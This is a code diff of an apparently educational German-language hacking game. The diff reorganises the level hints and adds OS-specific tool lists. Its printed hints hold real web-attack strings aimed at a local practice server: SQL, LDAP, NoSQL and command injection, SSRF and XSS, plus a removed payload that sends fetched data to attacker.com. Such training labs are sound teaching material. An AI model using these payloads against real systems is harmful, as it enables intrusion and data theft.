+            print("  • curl -s http://127.0.0.1:5000/debug")
+        else:
+            print("\n💡 WINDOWS WEB TESTING TOOLS:")
+            print(f"  • {commands['web_scan_ps']} → PowerShell Web Requests")
+            print(f"  • {commands['http_headers']} → HTTP Security Analysis")
+            print(f"  • {commands['grep']} 'API_KEY' → Text Search in Output")
+            print("  • curl -s http://127.0.0.1:5000/.env.local → Environment Discovery")
+
+        print("\n" + "-"*60)
+        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
+        print("-" * 60)
 
         # Enhanced success criteria
         success_patterns = [
@@ -1578,26 +1719,7 @@ class HackingGame:
         ]
 
         while True:
-            # Platform-specific command suggestions
-            if sys.platform.startswith('win'):
-                self.simulate_old_terminal("\n💡 WINDOWS WEB TESTING TOOLS:", delay=0.02)
-                self.simulate_old_terminal(f"  • {commands['web_scan_ps']} → PowerShell Web Requests", delay=0.02)
-                self.simulate_old_terminal(f"  • {commands['http_headers']} → HTTP Security Analysis", delay=0.02)
-                self.simulate_old_terminal(f"  • {commands['grep']} 'API_KEY' → Text Search in Output", delay=0.02)
-                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/.env.local → Environment Discovery", delay=0.02)
-            elif sys.platform.startswith('linux'):
-                self.simulate_old_terminal("\n💡 LINUX PENETRATION TESTING TOOLS:", delay=0.02)
-                self.simulate_old_terminal("  • curl -s -I http://127.0.0.1:5000/ | grep -i 'server'", delay=0.02)
-                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/.env.local", delay=0.02)
-                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/debug", delay=0.02)
-                self.simulate_old_terminal("  • curl -X OPTIONS http://127.0.0.1:5000/", delay=0.02)
-            else:  # macOS
-                self.simulate_old_terminal("\n💡 MACOS SECURITY TESTING TOOLS:", delay=0.02)
-                self.simulate_old_terminal("  • curl -s -H 'User-Agent: Security-Scanner' http://127.0.0.1:5000/", delay=0.02)
-                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/.env.local", delay=0.02)
-                self.simulate_old_terminal("  • curl -s http://127.0.0.1:5000/debug", delay=0.02)
-
-            cmd = input("\nGib deinen Web Application Security Testing Befehl ein: ").strip()
+            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen Befehl ein: ").strip()
             if not cmd:
                 continue
 
@@ -1610,6 +1732,8 @@ class HackingGame:
 
     def level_1_success_message(self, target_value):
         """Enhanced success message for Level 1"""
+        if audio:
+            audio.play_victory()
         flag = self.get_flag(1)
         self.simulate_old_terminal(f"\n🎉 EXCELLENT! Du hast das erste Geheimnis gefunden!", delay=0.02)
         self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
@@ -1646,8 +1770,8 @@ class HackingGame:
         print("\n" + "="*70)
         print("📚 TUTORIAL: Network Discovery & Reconnaissance")
         print("="*70)
-        print(f"\n🔍 PORT SCANNING ({sys.platform.upper()}):")
-        if sys.platform.startswith('win'):
+        print(f"\n🔍 PORT SCANNING ({self.os_mode.upper()}):")
+        if self.os_mode == 'windows':
             print(f"   {commands['port_scan']}     → Port Status prüfen")
             print(f"   {commands['port_scan_alt']}           → Port Connectivity Test")
             print(f"   {commands['port_scan_ps']}")
@@ -1660,14 +1784,14 @@ class HackingGame:
             print(f"   {commands['port_scan_service']}              → Service Detection")
             print(f"   {commands['port_scan_os']}               → OS Detection")
 
-        print(f"\n🌐 WEB APPLICATION SCANNING ({sys.platform.upper()}):")
+        print(f"\n🌐 WEB APPLICATION SCANNING ({self.os_mode.upper()}):")
         print(f"   {commands['web_scan']}  → Basic Web Scan")
-        if not sys.platform.startswith('win'):
+        if self.os_mode != 'windows':
             print(f"   {commands['web_scan_nikto']}  → Vulnerability Scanner")
             print(f"   {commands['web_scan_dirb']}     → Directory Brute-Force")
             print(f"   {commands['web_scan_gobuster']}")
         print(f"   {commands['http_methods']} → HTTP Methods")
-        if sys.platform.startswith('win'):
+        if self.os_mode == 'windows':
             print(f"   {commands['web_scan_ps']}")
 
         print("\n🔍 ADVANCED VULNERABILITY TESTING:")
@@ -1675,48 +1799,44 @@ class HackingGame:
         print("   curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
         print("   curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
         print("   curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")
-        print(f"\n🔍 SERVICE ENUMERATION ({sys.platform.upper()}):")
+        print(f"\n🔍 SERVICE ENUMERATION ({self.os_mode.upper()}):")
         print(f"   {commands['http_headers']}  → HTTP Headers analysieren")
         print(f"   {commands['http_methods']} → HTTP Methods")
         print(f"   {commands['web_scan']}  → Silent HTTP Request")
-        print("\n🎯 ZIEL: Finde den API-Key durch Network Discovery: {target_value[:8]}...")
+        print(f"\n🎯 ZIEL: Finde den API-Key durch Network Discovery: {target_value[:8]}...")
         print("="*70)
-
-        print(f"\n🔍 ZIEL: Finde den API-Key: {target_value[:8]}...")
-        print("💻 Verwende echte Network Discovery Tools")
 
         print("\n🎯 MISSION: Scanne den Server und finde versteckte Endpunkte!")
         print("💡 HINWEIS: Der API-Key ist in einem versteckten Endpunkt versteckt!")
         print("🔍 VERSUCHE: curl http://127.0.0.1:5000/api/secret oder ähnliche Endpunkte!")
-        print("💡 TIPP: Manche Endpunkte brauchen spezielle Authentifizierung...")
-        print("🔍 DENKE NACH: Was hast du in Level 1 gelernt?")
+
+        print(f"\n💡 VERFÜGBARE TOOLS ({self.os_mode.upper()}):")
+        if self.os_mode == 'windows':
+            print("  - netstat (Port Status Analysis)")
+            print("  - telnet (Port Connectivity Test)")
+            print("  - curl (HTTP Analysis)")
+            print("  - powershell (Advanced Network Commands)")
+            print("  - findstr (Text Search)")
+        else:
+            print("  - nmap (Port Scanning, Service Detection)")
+            print("  - nikto (Web Vulnerability Scanner)")
+            print("  - dirb/gobuster (Directory Brute-Force)")
+            print("  - curl (HTTP Analysis)")
+            print("  - netstat / ss (Local Port Analysis)")
+
+        print("\n" + "-"*60)
+        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
+        print("-" * 60)
 
         while True:
-            print(f"\n💡 VERFÜGBARE TOOLS ({sys.platform.upper()}):")
-            if sys.platform.startswith('win'):
-                print("  - netstat (Port Status Analysis)")
-                print("  - telnet (Port Connectivity Test)")
-                print("  - curl (HTTP Analysis)")
-                print("  - powershell (Advanced Network Commands)")
-                print("  - findstr (Text Search)")
-            else:
-                print("  - nmap (Port Scanning, Service Detection)")
-                print("  - nikto (Web Vulnerability Scanner)")
-                print("  - dirb/gobuster (Directory Brute-Force)")
-                print("  - curl (HTTP Analysis)")
-                print("  - netstat (Local Port Analysis)")
-            print("\n🔍 ADVANCED VULNERABILITY TESTING:")
-            print("  - SSRF: curl -X POST -d 'url=http://localhost:22' http://127.0.0.1:5000/ssrf")
-            print("  - Command Injection: curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
-            print("  - LDAP Injection: curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
-            print("  - NoSQL Injection: curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")
-
-            cmd = input("\nGib deinen Reconnaissance-Befehl ein: ").strip()
+            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen Reconnaissance-Befehl ein: ").strip()
             if not cmd:
                 continue
 
             success, _ = self.execute_game_command(cmd, 2)
             if success:
+                if audio:
+                    audio.play_victory()
                 flag = self.get_flag(2)
                 self.simulate_old_terminal(f"\n🎉 ERFOLG! Du hast die geheime Schnittstelle geknackt!", delay=0.02)
                 self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
@@ -1779,24 +1899,30 @@ class HackingGame:
         print("   • admin' UNION SELECT 1,2,3 --")
         print("   • ' OR 1=1 --")
 
-        while True:
-            print("\n💡 VERFÜGBARE TECHNIQUEN:")
-            print("  - Union-based SQL Injection")
-            print("  - Boolean-based Blind SQL Injection")
-            print("  - Time-based Blind SQL Injection")
-            print("  - Error-based SQL Injection")
-            print("  - Second-order SQL Injection")
-            print("\n🔍 ADVANCED ATTACK VECTORS:")
-            print("  - Race Condition: curl -X POST -d 'amount=500' http://127.0.0.1:5000/race")
-            print("  - Business Logic: curl -X POST -d 'product_id=1&quantity=5&price=-100' http://127.0.0.1:5000/business-logic")
-            print("  - Auth Bypass: curl -X POST -d 'user_id=1' http://127.0.0.1:5000/auth-bypass")
+        print("\n💡 VERFÜGBARE TECHNIKEN:")
+        print("  - Union-based SQL Injection")
+        print("  - Boolean-based Blind SQL Injection")
+        print("  - Time-based Blind SQL Injection")
+        print("  - Error-based SQL Injection")
+        print("  - Second-order SQL Injection")
+        print("\n🔍 ADVANCED ATTACK VECTORS:")
+        print("  - Race Condition: curl -X POST -d 'amount=500' http://127.0.0.1:5000/race")
+        print("  - Business Logic: curl -X POST -d 'product_id=1&quantity=5&price=-100' http://127.0.0.1:5000/business-logic")
+        print("  - Auth Bypass: curl -X POST -d 'user_id=1' http://127.0.0.1:5000/auth-bypass")
 
-            cmd = input("\nGib deinen SQL Injection Befehl ein (Browser oder curl): ").strip()
+        print("\n" + "-"*60)
+        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
+        print("-" * 60)
+
+        while True:
+            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen SQL Injection Befehl ein: ").strip()
             if not cmd:
                 continue
 
             success, _ = self.execute_game_command(cmd, 3)
             if success:
+                if audio:
+                    audio.play_victory()
                 flag = self.get_flag(3)
                 self.simulate_old_terminal(f"\n🎉 ERFOLG! SQL Injection war erfolgreich!", delay=0.02)
                 self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
@@ -1850,24 +1976,31 @@ class HackingGame:
         print(f"\n🔍 ZIEL: Finde den Session-Cookie: {target_value[:8]}...")
         print("💻 Verwende verschiedene XSS-Techniken")
 
-        while True:
-            print("\n💡 VERFÜGBARE XSS-TECHNIQUEN:")
-            print("  - Reflected XSS")
-            print("  - Stored XSS")
-            print("  - DOM-based XSS")
-            print("  - Filter Bypass")
-            print("  - Session Hijacking")
-            print("\n🔍 ADVANCED XSS PAYLOADS:")
-            print("  - <script>fetch('/api/users').then(r=>r.text()).then(d=>fetch('http://attacker.com/steal?data='+btoa(d)))</script>")
-            print("  - <img src=x onerror=\"fetch('/api/admin/data').then(r=>r.text()).then(d=>alert('Admin Data: '+d))\">")
-            print("  - <svg onload=\"fetch('/files/flag.txt').then(r=>r.text()).then(d=>alert('Flag: '+d))\">")
+        print("\n💡 VERFÜGBARE XSS-TECHNIKEN:")
+        print("  - Reflected XSS")
+        print("  - Stored XSS")
+        print("  - DOM-based XSS")
+        print("  - Filter Bypass")
+        print("  - Session Hijacking")
+        print("\n🔍 ADVANCED XSS PAYLOADS:")
+        print("  - <script>alert('XSS')</script>")
+        print("  - <img src=x onerror=alert('XSS')>")
+        print("  - <svg onload=alert(document.cookie)>")
+        print("  - <script>fetch('/api/users').then(r=>r.text()).then(d=>alert(d))</script>")
 
-            payload = input("\nGib deine XSS-Payload oder curl-Befehl ein: ").strip()
+        print("\n" + "-"*60)
+        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
+        print("-" * 60)
+
+        while True:
+            payload = input(f"\n💻 [{self.os_mode.upper()}] Gib deine XSS-Payload oder curl-Befehl ein: ").strip()
             if not payload:
                 continue
 
             success, _ = self.execute_game_command(payload, 4)
             if success:
+                if audio:
+                    audio.play_victory()
                 flag = self.get_flag(4)
                 self.simulate_old_terminal(f"\n🎉 ERFOLG! XSS Payload wurde ausgeführt & Session gekapert!", delay=0.02)
                 self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
@@ -1900,63 +2033,58 @@ class HackingGame:
         print("\n" + "="*70)
         print("📚 TUTORIAL: Digital Forensics & Advanced Hacking")
         print("="*70)
-        print("\n🔍 MEMORY ANALYSIS (Windows):")
-        print("   tasklist /v                    → Process List mit Details")
-        print("   wmic process get name,pid,commandline → Process Command Lines")
-        print("   powershell Get-Process | Select-Object Name,Id,Path")
-        print("\n🌐 NETWORK TRAFFIC ANALYSIS (Windows):")
-        print("   netstat -anb                    → Network Connections mit Prozessen")
-        print("   netstat -an | findstr :5000     → Specific Port Analysis")
-        print("   powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}")
-        print("\n🔐 CRYPTOGRAPHY ATTACKS (Windows):")
-        print("   certutil -hashfile file.txt MD5 → File Hashing")
-        print("   powershell Get-FileHash file.txt -Algorithm MD5")
-        print("   powershell ConvertFrom-SecureString → Decrypt Secure Strings")
-        print("\n🕵️ MALWARE ANALYSIS (Windows):")
-        print("   strings malware.exe             → String Extraction")
-        print("   file malware.exe                → File Type Detection")
-        print("   powershell Get-ItemProperty malware.exe | Select-Object *")
-        print("   objdump -d malware.exe")
-        print("   strace -e trace=all ./malware")
-        print("\n🎯 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
+        if self.os_mode == 'windows':
+            print("\n🔍 MEMORY ANALYSIS (Windows):")
+            print("   tasklist /v                    → Process List mit Details")
+            print("   wmic process get name,pid,commandline → Process Command Lines")
+            print("   powershell Get-Process | Select-Object Name,Id,Path")
+            print("\n🌐 NETWORK TRAFFIC ANALYSIS (Windows):")
+            print("   netstat -anb                    → Network Connections mit Prozessen")
+            print("   netstat -an | findstr :5000     → Specific Port Analysis")
+            print("   powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}")
+            print("\n🔐 CRYPTOGRAPHY ATTACKS (Windows):")
+            print("   certutil -hashfile file.txt MD5 → File Hashing")
+            print("   powershell Get-FileHash file.txt -Algorithm MD5")
+        else:
+            print(f"\n🔍 MEMORY & PROCESS ANALYSIS ({self.os_mode.upper()}):")
+            print("   ps aux | grep python            → Process List mit PID")
+            print("   top -b -n 1                     → System Process Snapshot")
+            print(f"\n🌐 NETWORK TRAFFIC ANALYSIS ({self.os_mode.upper()}):")
+            print("   netstat -tulnp (oder ss -tulnp) → Listening Ports")
+            print("   lsof -i :5000                   → Process on Port 5000")
+            print(f"\n🔐 CRYPTOGRAPHY & ARTIFACTS ({self.os_mode.upper()}):")
+            print("   sha256sum file.txt              → File Hashing")
+            print("   strings -n 8 memory.dump        → String Extraction")
+
+        print(f"\n🎯 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
         print("="*70)
 
-        print(f"\n🔍 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
-        print("💻 Verwende echte Forensik-Tools")
+        print(f"\n💡 VERFÜGBARE FORENSIK-TOOLS ({self.os_mode.upper()}):")
+        if self.os_mode == 'windows':
+            print("  - Tasklist (Process Analysis)")
+            print("  - Netstat (Network Analysis)")
+            print("  - Certutil (Cryptography)")
+            print("  - PowerShell (Advanced Analysis)")
+            print("  - curl (Inspect /forensics, /memory, /network, /files)")
+        else:
+            print("  - ps / top (Process Analysis)")
+            print("  - ss / netstat / lsof (Network Forensics)")
+            print("  - sha256sum / strings (Crypto & String Extraction)")
+            print("  - curl (Inspect /forensics, /memory, /network, /files)")
+
+        print("\n" + "-"*60)
+        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
+        print("-" * 60)
 
         while True:
-            print(f"\n💡 VERFÜGBARE FORENSIK-TOOLS ({sys.platform.upper()}):")
-            if sys.platform.startswith('win'):
-                print("  - Tasklist (Process Analysis)")
-                print("  - Netstat (Network Analysis)")
-                print("  - Certutil (Cryptography)")
-                print("  - PowerShell (Advanced Analysis)")
-                print("  - Strings (String Extraction)")
-                print("  - WMIC (System Information)")
-                print("\n🔍 ADVANCED FORENSIC TECHNIQUES (Windows):")
-                print("  - Process Analysis: tasklist /v | findstr suspicious")
-                print("  - Network Forensics: netstat -anb | findstr :5000")
-                print("  - File Analysis: powershell Get-ItemProperty file.exe | Select-Object *")
-                print("  - Registry Analysis: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
-            else:
-                print("  - Volatility (Memory Analysis)")
-                print("  - Wireshark/tshark (Network Analysis)")
-                print("  - John the Ripper (Password Cracking)")
-                print("  - Hashcat (Advanced Password Cracking)")
-                print("  - OpenSSL (Cryptography)")
-                print("  - Strings (String Extraction)")
-                print("\n🔍 ADVANCED FORENSIC TECHNIQUES (Linux/Mac):")
-                print("  - Memory Analysis: volatility -f memory.dump --profile=Win7SP1x64 pslist")
-                print("  - Network Forensics: tshark -r capture.pcap -Y 'http.request.method==POST'")
-                print("  - Steganography: steghide extract -sf hidden.jpg")
-                print("  - File Carving: foremost -i disk.img -o output/")
-
-            cmd = input("\nGib deinen Forensik-Befehl ein: ").strip()
+            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen Forensik-Befehl ein: ").strip()
             if not cmd:
                 continue
 
             success, _ = self.execute_game_command(cmd, 5)
             if success:
+                if audio:
+                    audio.play_victory()
                 flag = self.get_flag(5)
                 self.simulate_old_terminal(f"\n🎉 ERFOLG! Forensik-Analyse erfolgreich abgeschlossen!", delay=0.02)
                 self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
